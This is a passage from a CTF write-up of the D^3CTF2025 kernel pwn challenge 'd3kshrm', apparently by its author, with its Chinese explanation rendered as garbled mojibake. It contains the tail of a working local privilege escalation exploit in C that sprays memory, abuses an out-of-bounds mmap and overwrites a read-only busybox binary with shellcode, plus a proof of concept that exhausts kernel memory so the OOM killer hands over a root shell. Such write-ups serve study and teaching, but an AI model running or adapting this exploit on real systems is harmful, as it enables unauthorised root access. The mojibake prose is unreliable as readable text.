i &lt; D3KSHRM_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((d3kshrm_idx[i] = d3kshrm_create(d3kshrm_fd[i], PBF_SZ_PAGE_NR))&lt;<span class="hljs-number">0</span>)&#123;<br>            perror(ERROR_MSG(<span class="hljs-string">&quot;Failed to create D3KSHRM shared memory&quot;</span>));<br>            err_exit(<span class="hljs-string">&quot;FAILED to spray D3KSHRM shared memory.\n&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Expanding pipe_buffer...&quot;</span>);<br><br>    free_page(PAGE8_SPRAY_NR / <span class="hljs-number">2</span>);<br>    destroy_pgv_socket(PAGE8_SPRAY_NR / <span class="hljs-number">2</span>);<br><br>    <span class="hljs-keyword">if</span> (expand_pipe(pipe_fd1, <span class="hljs-number">0x1000</span> * <span class="hljs-number">64</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(ERROR_MSG(<span class="hljs-string">&quot;Failed to expand pipe_buffer&quot;</span>));<br>        err_exit(<span class="hljs-string">&quot;FAILED to expand first part of pipes.\n&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Expanding pipe_buffer...&quot;</span>);<br><br>    free_page((PAGE8_SPRAY_NR / <span class="hljs-number">2</span>) + <span class="hljs-number">2</span>);<br>    destroy_pgv_socket((PAGE8_SPRAY_NR / <span class="hljs-number">2</span>) + <span class="hljs-number">2</span>);<br><br>    <span class="hljs-keyword">if</span> (expand_pipe(pipe_fd2, <span class="hljs-number">0x1000</span> * <span class="hljs-number">64</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(ERROR_MSG(<span class="hljs-string">&quot;Failed to expand pipe_buffer&quot;</span>));<br>        err_exit(<span class="hljs-string">&quot;FAILED to expand second part of pipes.\n&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Splicing victim file into pipe group...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (splice_pipe(pipe_fd1, victim_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(ERROR_MSG(<span class="hljs-string">&quot;Failed to splice target fd&quot;</span>));<br>        err_exit(<span class="hljs-string">&quot;FAILED to splice victim file into pipe_fd1 group.\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (splice_pipe(pipe_fd2, victim_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(ERROR_MSG(<span class="hljs-string">&quot;Failed to splice target fd&quot;</span>));<br>        err_exit(<span class="hljs-string">&quot;FAILED to splice victim file into pipe_fd2 group.\n&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Doing mmap and mremap...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = D3KSHRM_SLUB_OBJ_NR; i &lt; D3KSHRM_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (d3kshrm_select(d3kshrm_fd[i], d3kshrm_idx[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            perror(ERROR_MSG(<span class="hljs-string">&quot;Failed to select D3KSHRM shared memory&quot;</span>));<br>            err_exit(<span class="hljs-string">&quot;FAILED to select D3KSHRM shared memory.\n&quot;</span>);<br>        &#125;<br><br>        oob_buf[i] = mmap(<br>            <span class="hljs-literal">NULL</span>,<br>            <span class="hljs-number">0x1000</span> * PBF_SZ_PAGE_NR,<br>            PROT_READ | PROT_WRITE,<br>            MAP_FILE | MAP_SHARED,<br>            d3kshrm_fd[i],<br>            <span class="hljs-number">0</span><br>        );<br>        <span class="hljs-keyword">if</span> (oob_buf[i] == MAP_FAILED) &#123;<br>            perror(ERROR_MSG(<span class="hljs-string">&quot;Failed to map chal_fd&quot;</span>));<br>            err_exit(<span class="hljs-string">&quot;FAILED to mmap chal_fd.\n&quot;</span>);<br>        &#125;<br><br>        oob_buf[i] = mremap(<br>            oob_buf[i],<br>            <span class="hljs-number">0x1000</span> * PBF_SZ_PAGE_NR,<br>            <span class="hljs-number">0x1000</span> * (PBF_SZ_PAGE_NR + <span class="hljs-number">1</span>),<br>            MREMAP_MAYMOVE<br>        );<br>        <span class="hljs-keyword">if</span> (oob_buf[i] == MAP_FAILED) &#123;<br>            perror(ERROR_MSG(<span class="hljs-string">&quot;Failed to mremap oob_buf area&quot;</span>));<br>            err_exit(<span class="hljs-string">&quot;FAILED to mremap chal&#x27;s mmap area.\n&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Checking for oob mapping...&quot;</span>);<br><br>    victim_buf = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = D3KSHRM_SLUB_OBJ_NR; i &lt; D3KSHRM_SPRAY_NR; i++) &#123;<br>        <span class="hljs-comment">/* Examine ELF header to see whether we hit the busybox */</span><br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">size_t</span>*) &amp;oob_buf[i][<span class="hljs-number">0x1000</span>*PBF_SZ_PAGE_NR] == <span class="hljs-number">0x3010102464c457f</span>)&#123;<br>            victim_buf = (<span class="hljs-type">void</span>*) &amp;oob_buf[i][<span class="hljs-number">0x1000</span>*PBF_SZ_PAGE_NR];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!victim_buf) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to oob mmap pages in pipe!&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Abusing OOB mmap to overwrite read-only file...&quot;</span>);<br>    <span class="hljs-built_in">memcpy</span>(victim_buf, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br><br>    log_success(<span class="hljs-string">&quot;[+] Just enjoy :)&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">banner</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(SUCCESS_MSG(<span class="hljs-string">&quot;-------- D^3CTF2025::Pwn - d3kshrm --------&quot;</span>) <span class="hljs-string">&quot;\n&quot;</span><br>    INFO_MSG(<span class="hljs-string">&quot;--------    Official Exploitation   --------\n&quot;</span>)<br>    INFO_MSG(<span class="hljs-string">&quot;--------      Author: &quot;</span>)<span class="hljs-string">&quot;arttnba3&quot;</span>INFO_MSG(<span class="hljs-string">&quot;      --------&quot;</span>) <span class="hljs-string">&quot;\n&quot;</span><br>    SUCCESS_MSG(<span class="hljs-string">&quot;-------- Local Privilege Escalation --------\n&quot;</span>));<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    banner();<br>    exploit();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Unintended-Solution"><a href="#Unintended-Solution" class="headerlink" title="Unintended Solution"></a>Unintended Solution</h2><p>éå¸¸æŠ±æ­‰æˆ‘å¹¶æœªå°†æ–‡ä»¶ç³»ç»Ÿé…ç½®å¥½ï¼Œä»è€Œå¯¼è‡´äº†éé¢„æœŸè§£çš„å‡ºç°ï¼Œåœ¨å¼€å§‹è®²è§£ä¹‹å‰æˆ‘è¦æ„Ÿè°¢æœ€åˆå‘ç°è¿™ä¸ªé—®é¢˜çš„æ¥è‡ª <a href="https://wm-team.cn/">W&amp;M</a> çš„ <a href="https://9anux.org/2025/06/02/d3kshrm/">Qanux</a> é€‰æ‰‹ï¼Œè¯´å®è¯ï¼Œè¿™ä¸ªæ¼æ´çš„å‡ºç°æ˜¯æˆ‘å°†æ–‡ä»¶ç³»ç»Ÿé…ç½®å¾—å¤ªå¸¸è§„äº†</p><p>ä¸€ä¸ªæœ€å°åŒ–çš„èƒ½å¤Ÿ <strong>åœ¨ä¸ä½¿ç”¨é¢˜ç›®æ¨¡å—</strong> çš„æƒ…å†µä¸‹ <strong>ç¨³å®š</strong> è§¦å‘éé¢„æœŸè§£çš„æ¦‚å¿µéªŒè¯å‡½æ•°å¦‚ä¸‹ ï¼ˆ <code>prepare_pgv_system()</code> å’Œ <code>alloc_page()</code> ç­‰å‡½æ•°å‚è§å‰é¢çš„ <code>exp.c</code> ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">unintended_exploit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> errno;<br>    prepare_pgv_system();<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((errno = create_pgv_socket(i)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(ERROR_MSG(<span class="hljs-string">&quot;[x] Failed to allocate socket: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to allocate socket!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((errno = alloc_page(i, <span class="hljs-number">0x1000</span> * <span class="hljs-number">64</span>, <span class="hljs-number">64</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(ERROR_MSG(<span class="hljs-string">&quot;[x] Failed to alloc pages on socket: &quot;</span>)<span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to allocate pages!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] No.%d times\n&quot;</span>, i);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done!?&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬æ‰§è¡Œè¿™ä¸€æ¦‚å¿µéªŒè¯æ—¶ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°æˆ‘ä»¬çš„è¿›ç¨‹çªç„¶åœæ­¢äº†ï¼Œéšåæˆ‘ä»¬æ²¡æœ‰åŸå› åœ°å¾—åˆ°äº†ä¸€ä¸ª root shellï¼š</p><p><img src="https://s2.loli.net/2025/06/03/YIoRTKiwm8bCe19.png"></p><p><strong>ä¸ºä»€ä¹ˆï¼Ÿ</strong> ä¸ºäº†å¼„æ¸…æ¥šåœ¨è¿™ä¸ªè¿‡ç¨‹å½“ä¸­æ‰€å‘ç”Ÿçš„ï¼Œè®©æˆ‘ä»¬ç®€å•çœ‹çœ‹è¿™ä¸ª pocï¼Œå…¶åªæ˜¯ç®€å•åœ°é€šè¿‡ packet socket çš„ <code>setsockopt()</code> ç³»ç»Ÿè°ƒç”¨ <strong>è¿›è¡Œäº†å†…å­˜åˆ†é…</strong> ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“å½“ä¸€ä¸ªè¿›ç¨‹åˆ†é…å¹¶å ç”¨äº†å¤§é‡å†…å­˜çš„æƒ…å†µä¸‹ï¼Œç³»ç»Ÿä¼šæ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—²å†…å­˜å¯ç”¨ï¼Œå› æ­¤  <a href="https://www.kernel.org/doc/gorman/html/understand/understand016.html">OOM Killer</a> ä¼šè¢«å”¤é†’ä»¥æ€æ­»è¿›ç¨‹æ¥å›æ”¶å†…å­˜</p><p>å“ªä¸ªè¿›ç¨‹ä¼šè¢«æ€æ‰ï¼Ÿæˆ‘ä»¬éƒ½çŸ¥é“åœ¨è¿™ä¸ªç¯å¢ƒä¸­ç”¨æˆ·æ€åªæœ‰å°‘æ•°å‡ ä¸ªè¿›ç¨‹ï¼Œå› æ­¤è¢«æ€è€…åªä¼šä» <code>rcS</code> ã€ <code>sh</code> ã€<code>exploit</code> å½“ä¸­äº§ç”Ÿï¼Œä½†æ˜¯è°æ˜¯é‚£ä¸ªä¸å¹¸è€…å‘¢ï¼Ÿå¥½å§ï¼Œ <a href="https://www.kernel.org/doc/gorman/html/understand/understand016.html">OOM Killer</a> é€šè¿‡åŒ…æ‹¬èµ„æºå ç”¨çš„å¤šç§å› ç´ æ¥ç¡®å®šå—å®³è€…ï¼Œè€Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>/proc/[pid]/oom_score</code> æ¥åˆ¤æ–­ï¼Œåˆ†æ•°è¶Šé«˜è¶Šå®¹æ˜“è¢«æ€ï¼Œä¸€ä¸ªç®€å•çš„æµ‹è¯•ç»“æœå¦‚ä¸‹ï¼ˆä½¿ç”¨ä¸€ä¸ªç®€å•çš„ C å‡½æ•°è¯»å–ï¼‰ï¼š</p><p><img src="https://s2.loli.net/2025/06/04/x7Vgjsch31p9XRm.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ° <code>rcS</code> ä¸ <code>sh</code> æœ‰ç€åŒæ ·çš„ OOM åˆ†æ•°ï¼Œå…¶ä¸­ä¹‹ä¸€ä¼šæˆä¸ºé‚£ä¸ªä¸å¹¸è€…ï¼Œå› ä¸ºæˆ‘ä»¬çš„ <code>exploit</code> çš„åˆ†æ•°æ›´ä½ï¼Œè€Œç”±äº <code>rcS</code> æ˜¯ root æƒé™è¿è¡Œè€Œ <code>sh</code> ä¸æ˜¯ï¼Œä¼¼ä¹æ€æ‰ <code>sh</code> æ˜¯æœ‰æ„ä¹‰çš„ï¼Ÿç­”æ¡ˆæ˜¯ <strong>æ˜¯ï¼Œä½†ä¸ä»…ä»…æ˜¯æ˜¯</strong> ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹çœŸæ­£å‘ç”Ÿäº†ä»€ä¹ˆï¼š</p><p><img src="https://s2.loli.net/2025/06/04/gerH8pOMsDUf2uy.png"></p><p><strong>ä»–ä»¬å…¨éƒ½è¢«æ€æ‰æ¥å›æ”¶å†…å­˜äº†ï¼</strong> ä½†æ˜¯ï¼Œä¸ºä»€ä¹ˆï¼Ÿä¸€ä¸ªéå¸¸é‡è¦çš„åŸå› ä¾¿æ˜¯åœ¨æ€æ‰ä¸€ä¸ªç‰¹å®šè¿›ç¨‹ä¹‹åï¼Œä»æœ‰å¯èƒ½ä»æ—§æ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—²å†…å­˜èƒ½å¤Ÿæ»¡è¶³åˆ†é…è¯·æ±‚ï¼Œè¿™å¯èƒ½æ˜¯ç”±äºå¼‚æ­¥çš„å†…å­˜å›æ”¶ã€å†…å­˜ç¢ç‰‡ç­‰åŸå› ï¼Œæ›´é‡è¦çš„æ˜¯ <em>æˆ‘ä»¬ä»åœ¨ç»§ç»­è¿›è¡Œå†…å­˜åˆ†é…</em> ï¼Œå› æ­¤ OOM killer ä¼šè¢«å¤šæ¬¡å”¤é†’ï¼ˆç”šè‡³åœ¨ä¸€æ¬¡åˆ†é…è¿‡ç¨‹å½“ä¸­ï¼‰ï¼ŒæŒ‰åˆ†æ•°ä¸æƒé™ä¾æ¬¡æ€æ‰ <code>sh</code> ä¸ <code>rcS</code> ï¼Œå¹¶æœ€ç»ˆæ€æ‰ <code>exploit</code></p><p><strong>è‹¥æ˜¯æ‰€æœ‰è¿™äº›è¿›ç¨‹éƒ½è¢«æ€æ‰ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</strong> ç”±äº <code>ttyS0</code> æ­¤æ—¶è¢«é—²ç½®ï¼Œ<code>init</code> å°†é‡æ–°å–å¾—æ§åˆ¶æƒå¹¶æ£€æµ‹åˆ°å…¶æ˜¯é—²ç½®çš„ï¼Œæ³¨æ„åˆ°æˆ‘ä»¬çš„åˆå§‹ç³»ç»Ÿä½¿ç”¨çš„æ˜¯ <code>busybox-init</code> ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥çœ‹åˆ° <code>/sbin/init</code> æ˜¯ <code>busybox</code> çš„ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼Œ <code>busybox-init</code> å°†ä¼šä½¿ç”¨ <code>/etc/inittab</code> ä½œä¸ºå…¶é…ç½®ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹ç¬”è€…åœ¨å¾ˆä¹…ä¹‹å‰éƒ½å‚ç…§  <a href="https://git.busybox.net/busybox/tree/examples/inittab?h=1_37_stable">official example from the busybox</a> å†™äº†ç‚¹ä»€ä¹ˆä¸œè¥¿ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-meta">::sysinit:/etc/init.d/rcS</span><br><span class="hljs-meta">::askfirst:/bin/ash</span><br><span class="hljs-meta">::ctrlaltdel:/sbin/reboot</span><br><span class="hljs-meta">::shutdown:/sbin/swapoff</span> -a<br><span class="hljs-meta">::shutdown:/bin/umount</span> -a -r<br><span class="hljs-meta">::restart:/sbin/init</span><br></code></pre></td></tr></table></figure><p>è®©æˆ‘ä»¬çœ‹çœ‹å€¼ä¸º <code>/bin/ash</code> çš„ <code>::askfirst:</code> é¡¹ï¼Œè¿™æ˜¯ä»€ä¹ˆæ„æ€ä¸”åœ¨ä»€ä¹ˆæ—¶å€™ä¼šè¢«æ‰§è¡Œï¼Ÿ <strong>å½“ TTY ä¸Šæ²¡æœ‰è¿›ç¨‹è¿è¡Œæ—¶ï¼Œç”±è¯¥é€‰é¡¹æŒ‡å®šçš„è¿›ç¨‹ä¼šè¢« &#x2F;sbin&#x2F;init ä»¥ root æƒé™å¯åŠ¨</strong> ï¼ˆå°±åƒ  <a href="https://en.wikipedia.org/wiki/Getty_(software)">getty</a> ï¼‰</p><p>ç°åœ¨æˆ‘ä»¬çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ä»¬èƒ½å¤Ÿè·å¾—ä¸€ä¸ª root shell äº†ï¼šåœ¨åˆå§‹åŒ–æ—¶ <code>/etc/init.d/rcS</code> è¿è¡Œåœ¨ <code>ttyS0</code> ä¸Šå¹¶ spawn äº†ä¸€ä¸ªç”¨æˆ·æ€ shell ä¾›æˆ‘ä»¬äº¤äº’ï¼Œå½“æˆ‘ä»¬åœ¨å†…æ ¸ç©ºé—´è¿›è¡Œæ— é™åˆ¶çš„å†…å­˜åˆ†é…å¹¶å ç”¨å‡ ä¹æ‰€æœ‰çš„ç©ºé—²å†…å­˜æ—¶ï¼Œ  <a href="https://www.kernel.org/doc/gorman/html/understand/understand016.html">OOM Killer</a> ä¼šè¢«å”¤é†’å¹¶æ€æ‰è¿™äº›ç”¨æˆ·æ€è¿›ç¨‹ï¼Œç”±äºæ­¤æ—¶æ²¡æœ‰è¿›ç¨‹åœ¨ <code>ttyS0</code> ä¸Šè¿è¡Œï¼Œ <strong>ç”± ::askfirst: é€‰é¡¹æŒ‡å®šçš„ &#x2F;bin&#x2F;ash å°†ä¼šè¢«æ‰§è¡Œï¼Œç»™äº†æˆ‘ä»¬ä¸€ä¸ª root shell</strong></p><p>è¿™ä¹Ÿæ˜¯æ¥è‡ª <a href="https://wm-team.cn/">W&amp;M</a> çš„ <a href="https://9anux.org/2025/06/02/d3kshrm/">Qanux</a> é€‰æ‰‹åœ¨æ¯”èµ›ä¸­å¦‚ä½•å·§åˆåœ°è§£å‡º <code>d3kshrm</code> çš„ï¼šä»–åªæ˜¯ä½¿ç”¨ <code>d3kshrm.ko</code> çš„åŠŸèƒ½è¿›è¡Œäº†å†…å­˜åˆ©ç”¨ï¼Œè€Œç”±äºæˆ‘çš„é”™è¯¯é…ç½®ä¸é”™è¯¯è®¾è®¡ï¼Œé¢˜ç›®é¢„è®¡çš„å¯åˆ†é…å†…å­˜æ¯”è™šæ‹Ÿæœºçš„å†…å­˜å¤§å¾—å¤šï¼Œå› æ­¤ OOM killer è¢«å¤šæ¬¡å”¤é†’å¹¶æ€æ‰äº† <code>init</code> ä»¥å¤–çš„æ‰€æœ‰ç”¨æˆ·æ€è¿›ç¨‹ï¼Œåœ¨è¿™ä¹‹å <code>ttyS0</code> è¢«é—²ç½®å› æ­¤ <code>busybox-init</code> å¯åŠ¨äº†ä¸€ä¸ª root shell</p><p>é‚£ä¹ˆç°åœ¨åˆæ¥äº†å¦ä¸€ä¸ªé—®é¢˜ï¼š <strong>æˆ‘ä»¬æ˜¯å¦èƒ½å¤Ÿç›´æ¥åœ¨ç”¨æˆ·ç©ºé—´è¿›è¡Œå†…å­˜åˆ†é…ï¼Œè€Œéåˆ©ç”¨å†…æ ¸çš„å†…å­˜åˆ†é… APIï¼Ÿ</strong> ç­”æ¡ˆæ˜¯ <strong>å¦å®šçš„</strong> ï¼Œä¸€ä¸ªéå¸¸é‡è¦çš„åŸå› æ˜¯å¦‚æœæˆ‘ä»¬çš„è¿›ç¨‹ç›´æ¥åˆ†é…äº†å¤§é‡çš„å†…å­˜ï¼ˆä¾‹å¦‚è¿›è¡Œå¤§é‡çš„ <code>malloc()</code> æ¥æ‰©å±•å †æ®µï¼‰ï¼Œ <strong>æˆ‘ä»¬çš„ OOM score å°†ä¼šåŒæ­¥å¿«é€Ÿå¢é•¿ï¼Œä¸”æˆ‘ä»¬çš„ exploit è¿›ç¨‹å¾€å¾€ä¼šæ˜¯ç¬¬ä¸€ä¸ªè¢«æ€æ‰çš„</strong> ï¼Œç”±äºæˆ‘ä»¬è¢«æ€æ‰äº†ï¼Œå†…å­˜åˆ†é…åœæ­¢äº†ï¼Œå› æ­¤å†…æ ¸ä¸å†éœ€è¦å”¤é†’ OOM Killer æ¥æ€æ‰å…¶ä»–å†…å­˜</p><p>åœ¨æˆ‘åœ¨æ¯”èµ›è¿‡ç¨‹ä¸­å¾—åˆ°é€‰æ‰‹çš„åé¦ˆå›¾ç‰‡æ—¶ï¼Œæˆ‘éå¸¸è¿…é€Ÿåœ°å°±æ„è¯†åˆ°è¿™å¿…å®šæ˜¯ OOM Killer å¼•èµ·çš„ï¼Œä½†æˆ‘æ²¡æœ‰é¢„è®¡åˆ°çš„æ˜¯åŒ…æ‹¬ <code>rcS</code> åœ¨å†…çš„æ‰€æœ‰è¿›ç¨‹éƒ½è¢«æ€æ‰äº†ï¼Œå› ä¸ºè¿™åœ¨æˆ‘ä»¥å¾€å‡ºè¿‡çš„ CTF é¢˜ç›®ä¸­éƒ½æ²¡æœ‰å‡ºç°è¿‡ï¼Œæˆ‘åŸæœ¬çš„é¢„æœŸæ˜¯ kernel å°†ä¼šç”±äº OOM è€Œ panicï¼Œä½†ç»“æœå‘Šè¯‰æˆ‘ kernel å¹¶ä¸æ€»æ˜¯ panic ï¼ˆå“ˆå“ˆï¼Œkernel ä¹Ÿæ€•æ­»å—ï¼Ÿï¼‰ï¼Œæ®é€‰æ‰‹æ‰€è¨€å…¶ç»™å‡ºçš„éé¢„æœŸè§£çš„æˆåŠŸç‡æ˜¯è‡³å°‘ <code>30%</code> ï¼Œä½†æˆ‘å†™çš„ POC çš„æˆåŠŸç‡è¶…è¿‡ <code>99%</code> ï¼Œæˆ‘è®¤ä¸ºä¸»è¦åŸå› æ˜¯ä½¿ç”¨çš„ API ä¸åŒï¼Œç”±äº <code>packet_set_ring()</code> ä½¿ç”¨ <code>vzalloc_nprof()</code> ï¼Œå…¶å¹¶ä¸å‘å†…æ ¸è¯·æ±‚ç‰©ç†è¿ç»­çš„å†…å­˜åŒºæ®µï¼ˆè€Œä»…æ˜¯è™šæ‹Ÿåœ°å€è¿ç»­ï¼‰ï¼Œè¿™æ„å‘³ç€å†…å­˜åˆ†é…å¯ä»¥è¢«ä»ä¸€ä¸ªé«˜é˜¶åˆ†å‰²ä¸ºæ•°ä¸ªä½é˜¶ï¼Œä½† <code>d3kshrm.ko</code> ä¸­çš„å‡½æ•°ç›´æ¥è°ƒç”¨äº† <code>alloc_pages()</code> æ¥åˆ†é…é«˜é˜¶å†…å­˜ï¼Œå› æ­¤å†…æ ¸ä¼šæ›´å®¹æ˜“ panic å› ä¸ºæˆ‘ä»¬æˆ–è®¸æ— æ³•å›æ”¶æ‰€éœ€çš„è¿ç»­çš„é«˜é˜¶ç‰©ç†å†…å­˜</p><p>æˆ‘æœ€ç»ˆå¦‚ä½•ä¿®å¤è¿™ä¸ªæ¼æ´ï¼Ÿæˆ‘åˆ›å»ºäº†è¯¥é¢˜ç›®çš„ä¸€ä¸ªå¤ä»‡ç‰ˆæœ¬ï¼Œä»…ä¿®æ”¹äº† <code>/etc/inittab</code> çš„ <code>::askfirst:</code> ä» <code>/bin/ash</code> å˜ä¸º <code>/sbin/poweroff</code> æ¥ä¸´æ—¶ä¿®å¤è¿™ä¸ªéé¢„æœŸæ¼æ´ï¼Œä½†æˆ‘è®¤ä¸ºå°†å…¶å˜ä¸º <code>login</code> æˆ–è®¸æ˜¯æ›´å¥½çš„é€‰æ‹©ï¼Ÿæ— è®ºå¦‚ä½•è¿™æ•™å¯¼äº†æˆ‘ä¸€å ‚è¯¾ï¼š <strong>ä¸€ä¸ªå®Œç¾çš„ç¯å¢ƒå¹¶ä¸æ€»æ˜¯æœ€é€‚åˆçš„</strong> ï¼Œä¸”æˆ‘åº”å½“ <strong>æ£€æŸ¥ç¯å¢ƒå½“ä¸­çš„æ¯æ ·äº‹ç‰©</strong> </p><h2 id="Whatâ€™s-moreâ€¦-1"><a href="#Whatâ€™s-moreâ€¦-1" class="headerlink" title="Whatâ€™s moreâ€¦"></a>Whatâ€™s moreâ€¦</h2><p>æœ¬é¢˜çš„ä»‹ç»æ¥è‡ªäºæˆ‘éå¸¸å–œæ¬¢çš„ä¸€ä¸ªç”± <a href="https://www.youtube.com/watch?v=0Kio3t3nXJo">Halo Top è®¾è®¡çš„å¹¿å‘Š</a> ï¼Œå°½ç®¡è¿™ä¸ªè§†é¢‘æˆ–è®¸åªæ˜¯ä¸ºäº†ä¹è¶£è€Œåˆ›é€ çš„ï¼Œä½†è¿™ä¹Ÿç»™äº†æˆ‘ä¸€äº›è¨€è¯­æ— æ³•è¡¨è¾¾çš„ç‰¹åˆ«æ„Ÿå—ï¼Œå› æ­¤æˆ‘é€‰æ‹©å…¶ä½œä¸ºé¢˜ç›®æè¿°çš„åŸºç¡€å¹¶ä¿®æ”¹äº†ä¸€éƒ¨åˆ†ä»¥ç»™ä½ ä»¬ä¸€äº›æ— æ„ä¹‰çš„å¥å­ï¼Œå°±åƒ flag æ‰€è¨€ï¼šï¼‰</p><p>æˆ‘åˆ›é€ è¿™ä¸ªé¢˜ç›®çš„æœ€åˆçš„çµæ„Ÿæ¥è‡ªäº <a href="https://github.com/arttnba3/Linux-kernel-exploitation/tree/main/CVE/CVE-2023-2008">CVE-2023-2008</a> ï¼Œå…¶åŒæ ·æ˜¯ä¸€ä¸ª OOB å†…å­˜æ˜ å°„çš„æ¼æ´ï¼Œå› æ­¤å®è¯å®è¯´è¿™ä¸ªé¢˜ç›®å¹¶ä¸å¦‚æˆ‘æ‰€é¢„æœŸçš„é‚£æ ·æœ‰éš¾åº¦ä¸”æœ‰åˆ›é€ æ€§ï¼Œéå¸¸æŠ±æ­‰æˆ‘è™½ç„¶ä¸€ç›´æƒ³ç»™ä½ ä»¬å±•ç¤ºä¸€äº›ç‚«é…·çš„ä¸œè¥¿ä½†è¿™ä¸€æ¬¡å¹¶æ²¡æœ‰å±•ç¤ºè¶³å¤Ÿåº“çš„ç©æ„</p><p>å¦ä¸€ä¸ªæˆ‘é€‰æ‹©ä¿®æ”¹ç°æœ‰æ¼æ´çš„åŸå› æ˜¯ <em>æˆ‘ç¡®å®æ²¡æœ‰å¤ªå¤šæ—¶é—´æ¥å®Œæˆè¿™äº›é¢˜ç›®</em> ï¼Œç”±äºæˆ‘å·²ç»ä»æœ¬ç§‘æ¯•ä¸šäº†ï¼Œæˆ‘å¹¶æ²¡æœ‰å¤ªå…³æ³¨äºæˆ‘çš„åè¾ˆä»¬ä»Šå¹´å‡†å¤‡ D^3CTF çš„æƒ…å†µï¼Œç›´åˆ° <strong>æ¯”èµ›å¼€å§‹çš„å¤§æ¦‚ 10 å¤©å‰</strong> æ‰çŸ¥é“ä»Šå¹´å‡ ä¹è¿˜æ²¡æœ‰ pwn é¢˜ï¼Œå› æ­¤æˆ‘ä¸å¾—ä¸åœ¨è„‘å­é‡Œå‡ ä¹æ²¡æœ‰ä»€ä¹ˆæ–°çš„ç ”ç©¶æˆæœçš„æƒ…å†µä¸‹å†²åˆºå‡†å¤‡ä»Šå¹´çš„ Pwn é¢˜ä»¥ç¡®ä¿æ¯”èµ›èƒ½åƒå¾€å¹´ä¸€æ ·æ­£å¸¸ä¸¾åŠï¼Œ <strong>éå¸¸æŠ±æ­‰ä»Šå¹´ç¬”è€…æœªèƒ½å¸¦æ¥å’Œ 2023 å¹´çš„ d3kcache ä¸€æ ·ç‚«é…·çš„ç©æ„</strong> </p><p>è€Œå¦‚æœä½ è¶³å¤Ÿæ³¨æ„ä¸­å›½å†…æ 